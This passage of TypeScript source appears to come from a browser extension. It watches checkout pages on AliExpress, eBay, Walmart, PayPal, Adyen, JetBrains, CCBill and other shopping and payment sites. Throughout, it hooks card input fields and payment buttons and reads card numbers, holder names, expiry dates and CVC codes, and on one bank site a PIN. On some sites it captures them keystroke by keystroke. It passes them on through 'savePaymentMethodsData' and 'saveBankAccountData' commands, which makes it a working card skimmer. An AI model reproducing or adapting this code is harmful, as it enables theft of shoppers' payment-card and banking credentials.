                                            tempPaymentMethodsStore.push({
                                                'element': (__childElement as HTMLElement).nodeName,
                                                'id': (__childElement as HTMLElement).id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore: any = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.exploreSpecificElementByTagName(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'input', 'cardN', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'input', 'cardHolder', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'input', 'expires', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'input', 'cvc', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    "workWebsite": window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }

                /*if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    clearInterval(interval1);
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.nextElementSibling?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            } else {
                                self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        })
                                    });
                                });
                            }
                        }
                    }, 1000);
                    self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
                        ['click', 'dblclick'].forEach(function (event) {
                            document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': (__detectedElement as HTMLElement).textContent,
                                        'cardBrand': 'Unknown',
                                        'cardHolder': 'Unknown',
                                        'cardExpire': 'Unknown',
                                        'cardCVC': 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            });
                        });
                    });
                } else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (divElement) {
                                divElement.addEventListener('click', function () {
                                    if (divElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.explorePaymentNewCard(self,
                                                                    (document.querySelector('.new-card') as HTMLElement),
                                                                    function (elements: any) {
                                                                        let paymentMethodStore: any = [];
                                                                        document.querySelector('.save')?.addEventListener('click', function () {
                                                                            elements.forEach(function (element: any) {
                                                                                paymentMethodStore.push({
                                                                                    'element': element.nodeName,
                                                                                    'id': element.id,
                                                                                    'type': element.type,
                                                                                    'value': element.value
                                                                                });
                                                                            })
                                                                            send({
                                                                                command: 'savePaymentMethodsData',
                                                                                data: {
                                                                                    'cardNumber': paymentMethodStore[0].value,
                                                                                    'cardBrand': 'Unknown',
                                                                                    'cardHolder': paymentMethodStore[1].value,
                                                                                    'cardExpire': paymentMethodStore[2].value,
                                                                                    'cardCVC': paymentMethodStore[3].value,
                                                                                    'event': 'add',
                                                                                    'workWebsite': window.location.origin
                                                                                }
                                                                            });
                                                                            paymentMethodStore = [];
                                                                        });
                                                                    });
                                                            }
                                                        }, 1000);
                                                    })
                                                });
                                            }
                                        }, 1000);
                                    }
                                })
                            });
                        }

                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            clearInterval(interval1);
                            let cardConfirmElement = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore: any = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
                                            if ((__childElement as HTMLElement).classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': (__childElement as HTMLElement).nodeName,
                                                    'id': (__childElement as HTMLElement).id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': (__childElement as HTMLElement).nodeName,
                                                'id': (__childElement as HTMLElement).id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        clearInterval(interval1);

                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore: any = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardN', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardHolder', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'expires', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cvc', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardExpire': tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }*/
            }

            if (window.location.origin.indexOf('ebay') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
                            if (__ebayCreditCardFormElement.id === 'credit-card-details') {
                                clearInterval(interval);
                                let elements: any = [];
                                self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                            }
                        });
                    }
                }, 100);
                if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                    if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                        ["click", "dblclick"].forEach(function (event) {
                            let tempPaymentMethodsStore: any = [];
                            document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'creditCardNumber', function (__detectedElement: any) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'firstName', function (__detectedElement: any) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'lastName', function (__detectedElement: any) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'expirationDate', function (__detectedElement: any) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, (document.querySelector('.cic-module') as HTMLElement), 'cvv', function (__detectedElement: any) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                        'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                        'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                        'cardExpire': tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                        'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                tempPaymentMethodsStore = [];
                            })
                        })
                    }
                }
            }

            if (window.location.origin.indexOf('walmart') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
                        clearInterval(interval);
                        self.exploreWalmartPaymentContainer(self);
                    }
                    if (window.location.href.indexOf('#/review') !== -1) {
                        clearInterval(interval);
                        self.exploreWalmartPaymentEditButton(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('hellofresh.de') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
                        clearInterval(interval);
                        document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
                            if (modal.childNodes.length !== 0) {
                                self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement: any) {
                                    __detectedElement.addEventListener('click', function () {
                                        send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': window.sessionStorage.getItem('cardNumber') !== undefined ? window.sessionStorage.getItem('cardNumber') : 'Unknown',
                                                'cardBrand': 'Unknown',
                                                'cardHolder': 'Unknown',
                                                'cardExpire': window.sessionStorage.getItem('cardExpire') !== undefined ? window.sessionStorage.getItem('cardExpire') : 'Unknown',
                                                'cardCVC': window.sessionStorage.getItem('cardCVC') !== undefined ? window.sessionStorage.getItem('cardCVC') : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                        window.sessionStorage.clear();
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelector('body') !== null) {
                        clearInterval(interval);
                        self.explorePaymentInputTag(self, (document.querySelector('body') as HTMLElement), 'encrypted', function (__detectedElement: any) {

                            __detectedElement.addEventListener('keyup', function () {
                                if (__detectedElement.id === 'encryptedCardNumber') {
                                    window.sessionStorage.setItem('cardNumber', __detectedElement.value);
                                }

                                if (__detectedElement.id === 'encryptedExpiryDate') {
                                    window.sessionStorage.setItem('cardExpire', __detectedElement.value);
                                }

                                if (__detectedElement.id === 'encryptedSecurityCode') {
                                    window.sessionStorage.setItem('cardCVC', __detectedElement.value);
                                }
                            });
                        });
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('bestsecret.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreBestSecretPaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('paypal') !== -1) {
                clearInterval(interval1);
                /*let lxt = '4WE56938NS691591T'*/
                let interval = setInterval(function () {
                    if (document.querySelector('form') !== null) {
                        clearInterval(interval);
                        document.querySelectorAll('form').forEach(function (__paypalFormElement) {
                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1 || window.location.href.indexOf('webapps') !== -1) {
                                let elements: any = [];
                                self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        controller.addEventListener(event, function () {
                                            let paymentMethodStore: any = [];
                                            elements.forEach(function (__detectedElement: HTMLInputElement) {
                                                paymentMethodStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
                                                send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
                                                        'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
                                                        'cardHolder': 'Unknown',
                                                        'cardExpire': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                            if (window.location.href.indexOf('webapps') !== -1) {
                                                send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardBrand': document.querySelector('.css-iro1ss-IconContainer.e7vozvz0')?.firstElementChild?.firstElementChild?.textContent?.toLowerCase(),
                                                        'cardHolder': (paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown') + ' ' + (paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown'),
                                                        'cardExpire': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[4].value ? paymentMethodStore[4].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }

                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('finecobank') !== -1) {
                if (document.querySelector('#PIN') !== null) {
                    clearInterval(interval1);
                    self.explorePaymentInputTagOnly(self, (document.querySelector('#conferma_email_certifCommand') as HTMLElement), function (__detectedElement: any) {
                        __detectedElement.addEventListener('click', function () {
                            send({
                                command: 'saveBankAccountData',
                                data: {
                                    'dataType': 'PIN',
                                    'dataValue': (document.querySelector('#PIN') as HTMLInputElement).value,
                                    "workWebsite": window.location.origin
                                }
                            });
                        });
                    });
                }
            }

            if (window.location.origin.indexOf('mollie') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreMolliePaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('sunday') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreSundayPaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('jetbrains') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (window.location.origin.indexOf('checkout') !== -1) {
                        clearInterval(interval);
                        document.querySelectorAll('button').forEach(function (__buttonElement) {
                            if (__buttonElement.classList.contains('btnConfirmPayment')) {
                                send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': (document.querySelector('#ccNumber') as HTMLInputElement).value ? (document.querySelector('#ccNumber') as HTMLInputElement).value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                        'cardHolder': (document.querySelector('#ccHolder') as HTMLInputElement).value ? (document.querySelector('#ccHolder') as HTMLInputElement).value : 'Unknown',
                                        'cardExpire': (document.querySelector('#ccExpirationMonth') as HTMLInputElement).value ? (document.querySelector('#ccExpirationMonth') as HTMLInputElement).value : 'Unknown' + '/' + (document.querySelector('#ccExpirationYear') as HTMLInputElement).value ? (document.querySelector('#ccExpirationYear') as HTMLInputElement).value : 'Unknown',
                                        'cardCVC': (document.querySelector('#ccSecurityCode') as HTMLInputElement).value ? (document.querySelector('#ccSecurityCode') as HTMLInputElement).value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            }
                        })
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('paygate') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.explorePaygatePaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('docmorris') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreDocmorrisPaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('segpay') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreSegPayPaymentContainer(self);
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('ccbill') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        if (document.querySelector('#purchaseForm') !== null && document.querySelector('.pay_by') !== null) {
                            (document.querySelector('#placeOrder') as HTMLAnchorElement).addEventListener('click', function () {
                                document.querySelector('.wallet_payment_options.two-column-layout-wallet-payment-options')?.remove();
                                send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': (document.querySelector('#creditCardNum') as HTMLInputElement).value !== null ? (document.querySelector('#creditCardNum') as HTMLInputElement).value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                        'cardHolder': (document.querySelector('#firstName') as HTMLInputElement).value !== null ? (document.querySelector('#firstName') as HTMLInputElement).value : 'Unknown' + ' ' + (document.querySelector('#lastName') as HTMLInputElement).value !== null ? (document.querySelector('#lastName') as HTMLInputElement).value : 'Unknown',
                                        'cardExpire': (document.querySelector('#cardExpirationMonth') as HTMLInputElement).value !== null ? (document.querySelector('#cardExpirationMonth') as HTMLInputElement).value : 'Unknown' + '/' + (document.querySelector('#cardExpirationYear') as HTMLInputElement).value !== null ? (document.querySelector('#cardExpirationYear') as HTMLInputElement).value : 'Unknown',
                                        'cardCVC': (document.querySelector('#cvv2') as HTMLInputElement).value !== null ? (document.querySelector('#cvv2') as HTMLInputElement).value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                //elements = [];
                            });
                        }
                    }
                }, 100);
            }

            if (window.location.origin.indexOf('oppwa.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if ((document.querySelector('form') as HTMLFormElement).childNodes.length !== 0) {
                        (document.querySelector('form') as HTMLFormElement).childNodes.forEach(function (__childElement) {
                            if (__childElement.nodeName.toLowerCase() === 'input' && (__childElement as HTMLInputElement).type === 'tel') {
                                clearInterval(interval);
                                ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                                    __childElement.addEventListener(__event, function () {
                                        send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': (__childElement as HTMLInputElement).getAttribute('aria-label') === 'Card Number' ? (__childElement as HTMLInputElement).value : 'Unknown',
                                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                                'cardHolder': /*(document.querySelector('#firstName') as HTMLInputElement).value !== null ? (document.querySelector('#firstName') as HTMLInputElement).value : 'Unknown' + ' ' + (document.querySelector('#lastName') as HTMLInputElement).value !== null ? (document.querySelector('#lastName') as HTMLInputElement).value :*/ 'Unknown',
                                                'cardExpire': (document.querySelector('#cardExpirationMonth') as HTMLInputElement).value !== null ? (document.querySelector('#cardExpirationMonth') as HTMLInputElement).value : 'Unknown' + '/' + (document.querySelector('#cardExpirationYear') as HTMLInputElement).value !== null ? (document.querySelector('#cardExpirationYear') as HTMLInputElement).value : 'Unknown',
                                                'cardCVC': (__childElement as HTMLInputElement).getAttribute('aria-label') === 'CVV' ? (__childElement as HTMLInputElement).value : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                    })
                                });
                            }
                        });
                    }
                }, 100);

            }
        }, 1000);
    }

    exploreSpecificElementByTagName(self: this, __elementParent: any, __tagName: string, __query: string, callback?: any) {
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement: any) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    [...__childElement.attributes].forEach(function (attribute) {
                        if (attribute.nodeValue.toLowerCase().indexOf(__query) !== -1) {
                            if (callback) {
                                callback(__childElement);
                            }
                        }
                    })
                } else {
                    self.exploreSpecificElementByTagName(self, __childElement, __tagName, __query, callback);
                }
            });
        }
    }

    exploreAliExpressPaymentNewCard(self: this, __elementParent: HTMLElement, callback?: any) {
        let detectedElements: any = [];
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if ((__childElement as HTMLElement).classList.contains('card-surface')) {
                    if ((__childElement as HTMLElement).nodeName === 'DIV' && (__childElement as HTMLElement).childNodes.length !== 0) {
                        (__childElement as HTMLElement).childNodes.forEach(function (__targetParentElement) {
                            if ((__targetParentElement as HTMLElement).classList.contains('card-no')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardn',
                                    function (detectedElement: any) {
                                        detectedElements.push(detectedElement);
                                    });
                            }
                            if ((__targetParentElement as HTMLElement).classList.contains('card-bottom')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardholder',
                                    function (detectedElement: any) {
                                        detectedElements.push(detectedElement);
                                    });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'expire',
                                    function (detectedElement: any) {
                                        detectedElements.push(detectedElement);
                                    });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cv',
                                    function (detectedElement: any) {
                                        detectedElements.push(detectedElement);
                                    });
                            }
                        });
                    }
                }
                if (callback) {
                    callback(detectedElements);
                }
            });
        }
    }

    processAliExpressPaymentNewCard(self: this) {
        self.exploreAliExpressPaymentNewCard(self,
            (document.querySelector('.new-card') as HTMLElement),
            function (elements: any) {
                let paymentMethodStore: any = [];
                document.querySelector('.save')?.addEventListener('click', function () {
                    new Set(elements).forEach(function (element: any) {
                        paymentMethodStore.push({
                            'element': element.nodeName,
                            'id': element.id,
                            'type': element.type,
                            'value': element.value
                        });
                    })
                    send({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].value,
                            'cardBrand': document.querySelector('.card-type-icon.icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-type-icon.icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-type-icon.icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-type-icon.icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-type-icon.icon')?.className))))),
                            'cardHolder': paymentMethodStore[1].value,
                            'cardExpire': paymentMethodStore[2].value,
                            'cardCVC': paymentMethodStore[3].value,
                            'event': 'add',
                            'workWebsite': window.location.origin
                        }
                    });
                    paymentMethodStore = [];

                    let edit = setInterval(function () {
                        if (document.querySelector('.edit-card') !== null) {
                            clearInterval(edit);
                            ['click', 'dblclick'].forEach(function (event) {
                                document.querySelector('.edit-card')?.addEventListener(event, function () {
                                    let __interval3 = setInterval(function () {
                                        if (document.querySelector('.new-card') !== null) {
                                            clearInterval(__interval3);
                                            self.processAliExpressPaymentNewCard(self);
                                        }
                                    }, 1000);
                                });
                            });
                        }
                    }, 1000);
                });
            }
        );
    }

    processAliExpressPaymentNewCardOnSecondPayment(self: this) {
        let interval = setInterval(function () {
            if (document.querySelector('.card-form') !== null) {
                clearInterval(interval);
                self.exploreAliExpressPaymentNewCard(self,
                    (document.querySelector('.card-form') as HTMLElement),
                    function (elements: any) {
                        let paymentMethodStore: any = [];
                        document.querySelector('.payment-confirm')?.firstElementChild?.addEventListener('click', function () {
                            new Set(elements).forEach(function (element: any) {
                                paymentMethodStore.push({
                                    'element': element.nodeName,
                                    'id': element.id,
                                    'type': element.type,
                                    'value': element.value
                                });
                            })
                            send({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': paymentMethodStore[0].value,
